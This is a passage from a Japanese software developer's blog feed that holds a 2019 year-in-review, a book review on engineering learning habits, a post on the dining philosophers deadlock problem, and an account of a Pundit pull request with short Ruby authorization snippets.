&lt;li>仕事では&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/CSS">CSS&lt;/a>に苦労していた気がする。&lt;/li>
&lt;/ul>
&lt;h2>5月&lt;/h2>
&lt;ul>
&lt;li>仕事して本を読んでいた。&lt;/li>
&lt;/ul>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2019%2F05%2F14%2F233736" title="プロになるためのWeb技術入門を読みました　O/Rマッピングフレームワークの目的 - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2019/05/14/233736?_ga=2.238937536.1182737160.1577696184-1938314347.1562511586">sasa5740.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2019%2F05%2F03%2F014637" title="大規模サービス技術入門を読みました。ついでにRubyでVB Codeを実装してみた - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2019/05/03/014637?_ga=2.218629593.1182737160.1577696184-1938314347.1562511586">sasa5740.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>特に大規模サービス技術入門はすごい良書で、この後にプロセスとかメモリとかの勉強に触れようと思ったのはこの本のおかげだ。&lt;/p>
&lt;h2>6月&lt;/h2>
&lt;ul>
&lt;li>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SQL">SQL&lt;/a>実践入門を読んだ。これも良書でもっと早く読んでおけば良かったなと思った。&lt;/li>
&lt;/ul>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2019%2F06%2F19%2F232907" title="SQL実践入門を読みました - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2019/06/19/232907?_ga=2.238423488.1182737160.1577696184-1938314347.1562511586">sasa5740.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;h2>7月&lt;/h2>
&lt;ul>
&lt;li>自分のPCを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ThinkPad">ThinkPad&lt;/a> X1 Carbonにした。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ubuntu">Ubuntu&lt;/a>のほうが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%B9%A5%D1">コスパ&lt;/a>良いじゃん！とイキって&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ubuntu">Ubuntu&lt;/a>にしたのだが、職場が&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/MacBook">MacBook&lt;/a>の状態で更に別の環境を手入れするのは面倒だった。次は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/MacBook">MacBook&lt;/a>買うと思う。&lt;br>
とはいえ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ubuntu">Ubuntu&lt;/a>をいれていろいろ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C8%A5%E9%A5%D6%A5%EB%A5%B7%A5%E5%A1%BC%A5%C6%A5%A3%A5%F3%A5%B0">トラブルシューティング&lt;/a>している内に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/UNIX">UNIX&lt;/a>コマンドの知見がたまったのでそれはそれで良かった。開発環境も設定さえちゃんとすれば不満なく使える。&lt;/li>
&lt;/ul>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2019%2F07%2F08%2F083000" title="個人開発用マシンをThinkPad X1 Carbon with Ubuntuにしました - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2019/07/08/083000?_ga=2.243746117.1182737160.1577696184-1938314347.1562511586">sasa5740.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;ul>
&lt;li>新しいPCを勝ってモチベ爆上がりしたのでGemを書いた。Pryを頑張って読んだ気がする。面識ない人からPRをもらって飛び跳ねたのも覚えている。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%A4%A5%EA%A5%A2%A5%B9">エイリアス&lt;/a>で十分なことに気づき特に使ってない。&lt;/li>
&lt;/ul>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2019%2F07%2F15%2F205709" title="クラスメソッドをPryのコマンドにできるGemをリリースしました - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2019/07/15/205709?_ga=2.8791669.1182737160.1577696184-1938314347.1562511586">sasa5740.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;h2>8月&lt;/h2>
&lt;ul>
&lt;li>引き続き別のGemを書いた。&lt;code>rails console&lt;/code>コマンドの実装を頑張って読んで書いた。ローカルではしっかり動作するの確認したんだけど職場のDocker環境でうまく動かなくて困っている。あと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>のバージョンへの依存も激しすぎる。名前はかなり気に入っている。&lt;/li>
&lt;/ul>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2019%2F08%2F20%2F090000" title="rails consoleに簡単にオプションを足せるようになるgemを作った - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2019/08/20/090000?_ga=2.251006406.1182737160.1577696184-1938314347.1562511586">sasa5740.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;ul>
&lt;li>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Linux">Linux&lt;/a>の本を読んだ。これまたすごい良書で自宅環境を&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ubuntu">Ubuntu&lt;/a>にした利点も感じた。&lt;/li>
&lt;/ul>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2019%2F08%2F28%2F222307" title="「試して理解　Linuxのしくみ」を読んだ - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2019/08/28/222307?_ga=2.185008745.1182737160.1577696184-1938314347.1562511586">sasa5740.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;h2>9月&lt;/h2>
&lt;ul>
&lt;li>ポエム書いた&lt;/li>
&lt;/ul>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2019%2F09%2F20%2F024930" title="エンジニアとして働いて - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2019/09/20/024930?_ga=2.8241906.1182737160.1577696184-1938314347.1562511586">sasa5740.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;ul>
&lt;li>この頃&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>以外の言語もちゃんとやらなきゃなという気持ちが高まりElixirを学習し始めた。&lt;/li>
&lt;/ul>
&lt;p>&lt;a href="https://sasa5740.hatenablog.com/entry/2019/09/28/203720?_ga=2.175967970.1182737160.1577696184-1938314347.1562511586">Elixirについて社内LTで発表したよ - Tallman&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://sasa5740.hatenablog.com/entry/2019/09/29/231818?_ga=2.175967970.1182737160.1577696184-1938314347.1562511586">tokyo.ex#13 elixir本体ソースコードもくもくリード会に参加してEnum.tally書いてみた - Tallman&lt;/a>&lt;/p>
&lt;h2>10月&lt;/h2>
&lt;ul>
&lt;li>株式会社&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B0%A5%ED%A1%BC%A5%D3%A5%B9">グロービス&lt;/a>に正式にジョインした。&lt;/li>
&lt;li>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B1%FE%CD%D1%BE%F0%CA%F3%B5%BB%BD%D1%BC%D4%BB%EE%B8%B3">応用情報技術者試験&lt;/a>を受けた。これも無事に受かったので嬉しい。&lt;/li>
&lt;li>ElixirへのPRがマージされた。大きめの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>へのコミットはこれが初めてであり、ましてや&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0%B8%C0%B8%EC">プログラミング言語&lt;/a>だったので相当嬉しかったことを覚えてる。強引感が否めなかったのでちょっと反省している。&lt;/li>
&lt;/ul>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Felixir-lang%2Felixir%2Fpull%2F9425" title="add Enum.frequencies and Enum.frequencies_by by QWYNG · Pull Request #9425 · elixir-lang/elixir" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/elixir-lang/elixir/pull/9425">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;ul>
&lt;li>Hacktoberfestだったので&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>にもパッチを送ってみた。放置されてるけど。後日&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>パッチ会でkamipoさんに聞いてみると優先順位が低いとのことだった。kamipoさんはすごい人。&lt;/li>
&lt;/ul>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Frails%2Frails%2Fpull%2F37576" title="where statement with associated table name check if the value is asso… by QWYNG · Pull Request #37576 · rails/rails" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/rails/rails/pull/37576">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;h2>11月&lt;/h2>
&lt;ul>
&lt;li>Punditにコミットした。仕事での困りを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>への貢献に変えるというのは一度やってみたかったので良かった。今年一番のPRだったと思う。&lt;/li>
&lt;/ul>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Fvarvet%2Fpundit%2Fpull%2F626" title="'.authorize' and '#authorize' return record even with passed record with namespace array by QWYNG · Pull Request #626 · varvet/pundit" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/varvet/pundit/pull/626">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;ul>
&lt;li>社内でLearning GraphQLの読書会をやった。自分で始めた最初の勉強会だった。英語の本しかでてなかったりで最終的に参加者が二人になってしまい進め方を反省した。&lt;/li>
&lt;/ul>
&lt;h2>12月&lt;/h2>
&lt;ul>
&lt;li>会社の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%C9%A5%D9%A5%F3%A5%C8%A5%AB%A5%EC%A5%F3%A5%C0%A1%BC">アドベントカレンダー&lt;/a>にPumaのノン&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D6%A5%ED%A5%C3%A5%AD%A5%F3%A5%B0">ブロッキング&lt;/a>I/Oについて調べた記事を投稿した。今年一番頑張って調べて書いた記事かもしれない。&lt;/li>
&lt;/ul>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fqiita.com%2FQWYNG%2Fitems%2F11d79bf1ef9450ecf5e7" title="PumaのコードからみるソケットへのノンブロッキングI/O - Qiita" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://qiita.com/QWYNG/items/11d79bf1ef9450ecf5e7">qiita.com&lt;/a>&lt;/cite>&lt;/p>
&lt;ul>
&lt;li>静的型付け言語もやりたいなぁと思って最近Rustを書いてる。とりあえず型&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B8%A5%A7%A5%CD%A5%EA%A5%AF%A5%B9">ジェネリクス&lt;/a>というやつを完全理解した。所有権とライフタイムで脳が爆発している、メモリ管理を学ぶのに良さそう。&lt;/li>
&lt;li>会社でReal World Httpの読書会を始めた。これを写経しているだけでFindyで一人前の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Gopher">Gopher&lt;/a>と認定されるぞ!&lt;/li>
&lt;/ul>
&lt;h2>まとめと来年の抱負&lt;/h2>
&lt;p>今年のはっきりとした成果は基本及び&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B1%FE%CD%D1%BE%F0%CA%F3%B5%BB%BD%D1%BC%D4">応用情報技術者&lt;/a>の取得とElixirのコミットくらいだろうか。&lt;br>
2020年は&lt;/p>
&lt;ul>
&lt;li>なにかしら外部の勉強会で登壇&lt;/li>
&lt;li>大学院に進学&lt;/li>
&lt;/ul>
&lt;p>の2つを達成したい。
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/JAIST">JAIST&lt;/a>の社会人コースの見学にいった。年始に願書をだそうと思っている。&lt;br>
僕はエンジニアとして一緒に働きたいと思っている人がいる。その人に少しでも近づけるようやっていきたい。&lt;/p>
&lt;/body></description></item><item><title>「エンジニアの知的生産術」を読んだ</title><link>https://qwyng.dev/posts/2019/12/24/142239/</link><pubDate>Tue, 24 Dec 2019 14:22:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/12/24/142239/</guid><description>&lt;body>
&lt;p>&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/4774198765/hatena-blog-22/">&lt;img src="https://images-fe.ssl-images-amazon.com/images/I/510ppvAzSeL._SL160_.jpg" class="hatena-asin-detail-image" alt="エンジニアの知的生産術 ──効率的に学び、整理し、アウトプットする (WEB+DB PRESS plusシリーズ)" title="エンジニアの知的生産術 ──効率的に学び、整理し、アウトプットする (WEB+DB PRESS plusシリーズ)">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/4774198765/hatena-blog-22/">エンジニアの知的生産術 ──効率的に学び、整理し、アウトプットする (WEB+DB PRESS plusシリーズ)&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span>&lt;a href="http://d.hatena.ne.jp/keyword/%C0%BE%C8%F8%20%C2%D9%CF%C2" class="keyword">西尾 泰和&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">出版社/メーカー:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B5%BB%BD%D1%C9%BE%CF%C0%BC%D2">技術評論社&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2018/08/10&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> 単行本（ソフトカバー）&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
&lt;h3>読んだ理由&lt;/h3>
&lt;p>エンジニアとして働き始めたこの一年間、どうにも自分が闇雲に進んでいる感覚が拭えなかった。&lt;br>
目標にしている人はたくさんいるのだけれど、果たして自分は効率的に目的に向かっているのか？という疑問を感じるようになってきたので読んだ。&lt;/p>
&lt;h3>新しいことを学ぶには&lt;/h3>
&lt;p>情報収集、実践、応用はよく学習本であるやつという感想だったが、具体的に技術書を写経することについて述べられているのが面白かった。写経は効率が低いけれども写経しないと理解できないほどの問題に立ち向かわないとコンフォートゾーンから出れない、と書かれていた。最近自分もRustの技術書をヒィヒィ言いながら写経しているのだけれど、この本で少し勇気づけられた。&lt;br>
写経するときも頭を使って書き換えやコメントを利用しようとも書かれていた。このあたりは自分もよくやるのでこれからもやっていきたい。&lt;br>
逆に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>の本を一から十まで写経するのも効率が良くなかったなという反省もあった。&lt;/p>
&lt;h3>やる気を出すには&lt;/h3>
&lt;p>この本ではタスクを一つに絞り、タスクを小さくするためにポモドーロ・テクニックを活用することが書かれていた。&lt;br>
タスクをマルチにするのは良くないのは自分も感じていて、同期的にタスクをこなすというのは腑に落ちた。
このブログもポモドーロ・テクニックを使って書いている。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A5%DE%A5%DB">スマホ&lt;/a>を見ないと決めるのは大きな効果があった。&lt;/p>
&lt;h3>記憶を鍛えるには&lt;/h3>
&lt;p>この章で面白かったのは、一度読んで思い出してからさらにもう一度読むという「思い出し学習」が単に本を四回読んだだけの人より学習効果が高かったというものだ。&lt;br>
「思い出し」というのは記憶の穴を自己認識し危機感を得られる行為らしい。技術書を読んだあとに目次をみて内容を説明できるか？というぐらいなら真似しやすいだろうか。ブログを書くにのは二回目の通読のような気がするので、ブログを書く前に「思い出し」をやるといいかもしれない。&lt;/p>
&lt;h3>効率的に読むには&lt;/h3>
&lt;p>読書の目的は大雑把な地図、思考の道具というのが面白かった。自分の場合何しろ基礎体力が足りないと感じているので大雑把な地図がほしい。そのためにいろいろな分野をつまみ食いする。というのが大事なフェーズなんだろうと感じた。
とりあえずブログを書いて人に教えるを重点的に意識したほうが良さそう。&lt;/p>
&lt;h3>何を学ぶべきか？&lt;/h3>
&lt;p>戦略をもって学ぶのが良いということが書かれていた。
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%BA%B9%CA%CC%B2%BD%C0%EF%CE%AC">差別化戦略&lt;/a>について語られていて、A要素だけでは人に勝てないならB要素もかけ合わせて卓越することが重要だと書かれていた。よくキャリア戦略なんかでも語られている考え方だと思う。「境界をまたぐ、複数の組織に属する」というのは本や&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>でも達成できることのような気もするけど、実際に体験するためには働いたり留学なり何かしら義務を持ったほうがいいのだろうか。&lt;/p>
&lt;h3>まとめ&lt;/h3>
&lt;p>現実の行動で変わったことは&lt;/p>
&lt;ul>
&lt;li>ポモドーロ・テクニックを使うようになった&lt;/li>
&lt;li>広く片っ端からつまみぐいすることも悪くないと考える様になった。&lt;/li>
&lt;li>本を読んだあとに目次をなめる行動をするようになった。&lt;/li>
&lt;/ul>
&lt;p>ぐらいだろうか、周りがすごいエンジニアばかりで差別化するというのがなかなか思いつかない。&lt;/p>
&lt;/body></description></item><item><title>「食事する哲学者」で学ぶデッドロック</title><link>https://qwyng.dev/posts/2019/11/28/015035/</link><pubDate>Thu, 28 Nov 2019 01:50:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/11/28/015035/</guid><description>&lt;body>
&lt;p>最近
&lt;a href="https://doc.rust-jp.rs/the-rust-programming-language-ja/1.6/book/README.html">プログラミング言語Rust&lt;/a>を読んでるのですが、並行処理の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C1%A5%E5%A1%BC%A5%C8%A5%EA%A5%A2%A5%EB">チュートリアル&lt;/a>で「食事する哲学者」という問題を知りました。&lt;/p>
&lt;blockquote>&lt;p>昔々、裕福な慈善家が、5人の高名な哲学者が宿泊できるカレッジを寄付しました。それぞれの哲学者には思索活動にふさわしい部屋が与えられました; また共用の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C0%A5%A4%A5%CB%A5%F3%A5%B0%A5%EB%A1%BC%A5%E0">ダイニングルーム&lt;/a>もあり、そこには丸いテーブルが置かれ、5人それぞれが専用で使うイス5脚で取り囲まれていました。 彼らはテーブルを反時計回りに座ります。哲学者の左側にはそれぞれ金のフォークが配され、 中央には大きなボウルに入ったスパゲッティが常に補充されていました。哲学者は大半の時間を思慮に費やすのですが; 空腹になった時は、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C0%A5%A4%A5%CB%A5%F3%A5%B0%A5%EB%A1%BC%A5%E0">ダイニングルーム&lt;/a>に出向き、自分専用のイスに座り、左側のフォークを取上げ、スパゲッティに突き刺します。 しかし、絡まり合ったスパゲッティを口元まで運ぶには2本目のフォークが必要でした。なので哲学者は自分の右側にあるフォークも使う必要がありました。 食べ終わったら両側のフォークを元に戻し、席から立ちあがって、思索活動を続けます。 もちろん、1本のフォークは同時に1人の哲学者しか使えません。他の哲学者が食事したければ、 フォークが再び戻されるまで待たねばなりません。&lt;/p>&lt;/blockquote>
&lt;p>並行処理で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C7%A5%C3%A5%C9%A5%ED%A5%C3%A5%AF">デッドロック&lt;/a>が起こりうる問題です。
&lt;figure class="figure-image figure-image-fotolife" title="丸が哲学者で棒がフォークです！！！！">&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20191127/20191127212423.png" alt="f:id:sasa5740:20191127212423p:plain" title="f:id:sasa5740:20191127212423p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;figcaption>丸が哲学者で棒がフォークです！！！！&lt;/figcaption>&lt;/figure>
そのまま各哲学者が同時に右のフォークをとるとこうなります&lt;/p>
&lt;p>&lt;figure class="figure-image figure-image-fotolife" title="丸が哲学者で棒がフォークです！！！！！！！">&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20191127/20191127212547.png" alt="f:id:sasa5740:20191127212547p:plain" title="f:id:sasa5740:20191127212547p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;figcaption>丸が哲学者で棒がフォークです！！！！！！！&lt;/figcaption>&lt;/figure>&lt;/p>
&lt;p>この状態になってしまうと1が左のフォークを取りたくても5が持っているので取れない、5も早くパスタをとってフォークをおろしたいけど4がフォークを持っているので取れない。…となり全員がお互いのフォークを下ろすのをおみあいしてしまう、いわゆる&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C7%A5%C3%A5%C9%A5%ED%A5%C3%A5%AF">デッドロック&lt;/a>状態になります。&lt;/p>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0%B8%C0%B8%EC">プログラミング言語&lt;/a>Rustでは5だけ最初に左のフォークを取らせて確実に誰かが両手にフォークを持てる状況を強制させていました。&lt;br>
この問題は
&lt;a href="https://ja.wikipedia.org/wiki/%E9%A3%9F%E4%BA%8B%E3%81%99%E3%82%8B%E5%93%B2%E5%AD%A6%E8%80%85%E3%81%AE%E5%95%8F%E9%A1%8C#cite_note-6">食事する哲学者の問題 - Wikipedia&lt;/a>にも乗ってるけど色々&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C7%A5%C3%A5%C9%A5%ED%A5%C3%A5%AF">デッドロック&lt;/a>を起こさない方法があります。&lt;/p>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%BB%A5%DE%A5%D5%A5%A9">セマフォ&lt;/a>って概念ここで初めて知りました。
dirty/cleanなんかはページングで使われてる気がする。&lt;/p>
&lt;p>Rustに&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%BB%A5%DE%A5%D5%A5%A9">セマフォ&lt;/a>あったみたいだけど非推奨になっていた。MutexとCondvarでなんとかするのだろうか。&lt;/p>
&lt;/body></description></item><item><title>Punditにコミットした</title><link>https://qwyng.dev/posts/2019/11/12/220609/</link><pubDate>Tue, 12 Nov 2019 22:06:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/11/12/220609/</guid><description>&lt;body>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Fvarvet%2Fpundit%2Fpull%2F626" title="'.authorize' and '#authorize' return record even with passed record with namespace array by QWYNG · Pull Request #626 · varvet/pundit" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/varvet/pundit/pull/626">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>結果的には破壊的変更をしてしまったのでPR送った経緯を書いておこうと思う。 もちろんこのままリリースされるかはわからないけど。 &lt;br>
ちなみにPunditは以下のように明瞭な形でリソースに対しての行動に制約を設定できるようになるGemだ。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class PostPolicy
attr_reader :user, :post
def initialize(user, post)
@user = user
@post = post
end
def update?
user.admin? or not post.published?
end
end
# in controller
def update
@post = authorize Post.find(params[:id])
if @post.update(post_params)
redirect_to @post
else
render :edit
end
end
&lt;/pre>
&lt;p>書きやすく読みやすいコードが書けて良いGemだと思う。&lt;/p>
&lt;h2>PRを立てた経緯&lt;/h2>
&lt;p>業務でPunditを利用させてもらっていて、ちょっと面倒なところがあった。&lt;/p>
&lt;p>&lt;a href="https://github.com/varvet/pundit#policy-namespacing">https://github.com/varvet/pundit#policy-namespacing&lt;/a>
にもあるがこのようなコードだ。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> module Admin
class PostPolicy
~~
end
end
class AdminController &amp;lt; ApplicationController
def authorize(record, query = nil)
super([:admin, record], query)
end
end
class Admin::PostController &amp;lt; AdminController
def show
post = Post.find(params[:id])
authorize(post)
end
end
&lt;/pre>
&lt;p>「同じリソースに対してpolicy&lt;a href="#f-70f30c2f" name="fn-70f30c2f" title="Punditではリソースに対しての制約をpolicyと呼ぶ">*1&lt;/a>を&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%CC%BE%C1%B0%B6%F5%B4%D6">名前空間&lt;/a>で分けて複数設定する」というのはよく行うのだけれど、Punditは上記のように&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%CC%BE%C1%B0%B6%F5%B4%D6">名前空間&lt;/a>を配列で渡すとpolicyを推測して読み込んでくれる。&lt;br>
がしかし、この方法をつかうとせっかくクールなこの書き方が使えなくなってしまう。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def show
@user = authorize User.find(params[:id])
end
&lt;/pre>
&lt;p>&lt;code>authorize&lt;/code>は渡された引数をそのまま返すので上記のように綺麗にかけるのだが、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%CC%BE%C1%B0%B6%F5%B4%D6">名前空間&lt;/a>を推測させるために配列を渡すとそのまま配列が帰ってきてしまうのである。&lt;br>
仕方がないので業務では&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class AdminController &amp;lt; ApplicationController
def authorize(record, query = nil)
super([:admin, record], query)
record
end
end
&lt;/pre>
&lt;p>としてrecordが帰ってくるようにした。&lt;a href="#f-21322c3d" name="fn-21322c3d" title="もちろんこのままじゃないですよ！">*2&lt;/a>&lt;/p>
&lt;p>recordが帰ってくるのが望ましいだろう、ということでせっかくの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>だし修正の提案をしたのがPRを立てるまでの経緯だ。&lt;/p>
&lt;h2>PR立てた後&lt;/h2>
&lt;p>マージされるまでメンテナーの方に丁寧なレビューをもらい感謝しかない。こういってはなんだが自分としては無料で自分のコードみてもらって良いことしかなかった。&lt;br>
「&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>はやることが多くて大変」という言葉を&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>パッチ会でkoicさんもおっしゃっていたが、本当に尊敬できる方たちだと思う。&lt;br>
Punditという素晴らしいGemをメンテしていただきありがとうございます。&lt;br>
&lt;s>READMEの更新を忘れて後ですごすごPR立ててすいません &lt;/s>&lt;br>
最近Elixirが楽しかったが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>もやっぱり面白い。&lt;/p>
&lt;div class="footnote">
